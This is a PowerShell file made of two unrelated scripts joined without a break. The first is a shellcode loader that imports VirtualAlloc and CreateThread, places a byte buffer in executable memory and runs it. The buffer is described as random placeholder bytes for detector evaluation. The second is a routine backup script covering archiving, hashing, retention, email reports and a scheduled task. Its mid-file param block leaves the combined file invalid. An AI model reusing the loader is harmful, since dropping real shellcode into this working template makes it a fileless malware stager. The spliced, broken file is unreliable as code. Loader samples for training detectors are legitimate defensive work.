<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x95, 0xc2, 0x44, 0x1d, 0xd6, 0x14, 0xe8, 0xee, 0x59, 0x4b, 0x87, 0x42, 0xa3, 0xf2, 0x49, 0x38,
        0x18, 0xe6, 0x05, 0x76, 0x07, 0x40, 0xb1, 0x19, 0x6e, 0xbf, 0x3c, 0xa8, 0xe6, 0x81, 0x0d, 0xe6,
        0x73, 0xfb, 0x77, 0x2f, 0xe7, 0xce, 0x42, 0xc1, 0x67, 0xe5, 0x06, 0x51, 0x55, 0x6a, 0x6e, 0x3d,
        0xa5, 0x02, 0x43, 0xaf, 0xe4, 0xef, 0x7b, 0x0b, 0xc8, 0x05, 0x8e, 0x4e, 0x4b, 0xd1, 0xc1, 0x6d,
        0x56, 0xc9, 0x83, 0x46, 0xd6, 0x00, 0x46, 0x82, 0x34, 0x7a, 0x75, 0xb8, 0xdc, 0x30, 0x45, 0x48,
        0xb8, 0x28, 0xf9, 0xc6, 0x0d, 0x42, 0xfb, 0xae, 0xfa, 0x98, 0x5a, 0xd3, 0x23, 0x09, 0xce, 0x26,
        0x31, 0x82, 0x72, 0x8d, 0x86, 0x49, 0xbd, 0x40, 0xf6, 0xfe, 0xe2, 0x23, 0xfe, 0x59, 0x1c, 0x92,
        0x94, 0x05, 0x96, 0x9c, 0xe0, 0x72, 0xc0, 0x87, 0x67, 0x8f, 0x15, 0x21, 0x97, 0x38, 0x29, 0xd9,
        0x21, 0x18, 0x58, 0x63, 0xc1, 0x69, 0x1c, 0xc1, 0x93, 0x99, 0x36, 0x4d, 0xda, 0xe1, 0x5e, 0x56,
        0xeb, 0x2c, 0x13, 0x6f, 0xee, 0x85, 0xb8, 0x86, 0x4b, 0xcb, 0xee, 0x8f, 0xdc, 0x0e, 0x30, 0x06,
        0xbc, 0x86, 0x91, 0x42, 0xac, 0xf6, 0x10, 0xec, 0xda, 0xf2, 0x57, 0x26, 0x3c, 0x48, 0x14, 0x6b,
        0xb2, 0x33, 0xcc, 0xf6, 0x2d, 0xeb, 0x27, 0x02, 0x98, 0x81, 0x3a, 0x5f, 0x45, 0x81, 0x70, 0x31,
        0x69, 0x4e, 0xb9, 0xb9, 0x58, 0xae, 0x52, 0x5d, 0xc8, 0xa7, 0xa1, 0xd7, 0x99, 0xaa, 0xbb, 0xdb,
        0xaf, 0x75, 0x60, 0x9e, 0xcd, 0x9a, 0x71, 0x04, 0x3e, 0x13, 0x19, 0x37, 0x99, 0x39, 0xb9, 0x42,
        0x5b, 0x13, 0xc8, 0x6a, 0xec, 0x71, 0x22, 0x72, 0x2d, 0xcb, 0xb3, 0x0e, 0x48, 0xb5, 0x11, 0x87,
        0x7a, 0xca, 0x52, 0xa0, 0x89, 0x85, 0x15, 0x53, 0x19, 0xfe, 0x8b, 0xc1, 0xb8, 0xa3, 0x08, 0xb7,
        0xdf, 0x1c, 0x8b, 0x2a, 0xbd, 0x2c, 0x94, 0x46, 0x4e, 0x11, 0x3a, 0xb3, 0x07, 0x60, 0x66, 0xaf,
        0x0e, 0x23, 0xc3, 0xf2, 0xa5, 0xdb, 0xdb, 0xbc, 0x75, 0x53, 0x97, 0x24, 0xa0, 0x87, 0x5f, 0x3a,
        0x87, 0x00, 0x3e, 0x71, 0x74, 0x5f, 0x08, 0x81, 0xfd, 0xa9, 0x8c, 0xac, 0x00, 0x22, 0x22, 0xd4,
        0x8e, 0x4a, 0x24, 0xa6, 0xe0, 0xc7, 0x37, 0x79, 0x7f, 0x16, 0x0c, 0x82, 0xd0, 0x98, 0x6c, 0x74,
        0x84, 0x47, 0xcc, 0x76, 0x0a, 0x14, 0x70, 0x84, 0xbd, 0x6a, 0x0f, 0x3d, 0x31, 0x50, 0x8a, 0x75,
        0x61, 0x92, 0x95, 0x01, 0x3e, 0x0d, 0xbd, 0x40, 0x72, 0x03, 0xbf, 0x98, 0x1d, 0xde, 0xe9, 0x36,
        0xc1, 0xfe, 0x5a, 0x12, 0x87, 0x78, 0x93, 0x00, 0x86, 0x98, 0x10, 0xa2, 0xb9, 0xe4, 0x0c, 0x60,
        0x27, 0x6e, 0x10, 0x4f, 0xdf, 0xa1, 0xd0, 0x76, 0xf6, 0x5f, 0x52, 0xb9, 0xce, 0x0e, 0x43, 0x93,
        0x97, 0x45, 0xbe, 0x53, 0x3d, 0x56, 0xf3, 0xd4, 0xac, 0x1d, 0x0d, 0x7b, 0xe5, 0x58, 0x15, 0x29,
        0xe3, 0x30, 0x90, 0x43, 0x20, 0x62, 0xe2, 0x1d, 0xcd, 0x59, 0x3b, 0xd1, 0x3c, 0xa0, 0xb6, 0xe2,
        0xd5, 0xe3, 0xde, 0xed, 0x51, 0x16, 0xf8, 0x8e, 0x57, 0x55, 0x95, 0x11, 0xa5, 0xaa, 0x93, 0x56,
        0xf6, 0x9a, 0xaa, 0xf5, 0x1d, 0x5a, 0x5e, 0x84, 0x4c, 0x3b, 0xa3, 0x3a, 0x6b, 0x4d, 0x85, 0xd5,
        0xf0, 0x7b, 0xa6, 0x80, 0xed, 0x1a, 0x8c, 0x53, 0xb2, 0xcd, 0x11, 0x27, 0x14, 0xff, 0x6a, 0x76,
        0xc1, 0xbb, 0xca, 0x2d, 0x59, 0x93, 0xfa, 0x5e, 0x50, 0x70, 0x62, 0xc9, 0x51, 0x6a, 0x7d, 0x50,
        0x2a, 0xbf, 0xe2, 0x99, 0xbc
    )

    $Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 1554)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
[CmdletBinding()]
param(
    [string]$SourcePath = 'C:\Apps\Infra.Agent',
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = 'D:\Backups\Agent',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 21,
    [ValidateSet('Optimal', "Fastest", 'NoCompression')]
    [string]$CompressionLevel = 'Optimal',
    [int]$MinFreeGB = 25,
    [switch]$DryRun
)

$ErrorActionPreference = "Stop"


New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$jsonBody = $manifest | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8
$style = @'
<style>
body { font-family: Arial; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = "backup-ops@internal.corp"
$MailFrom = "backup@internal.corp"
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject 'Backup completed' `
    -Body $mailBody `
    -SmtpServer 'smtp.internal.corp' `
    -Port 587

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At '12:30'
Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
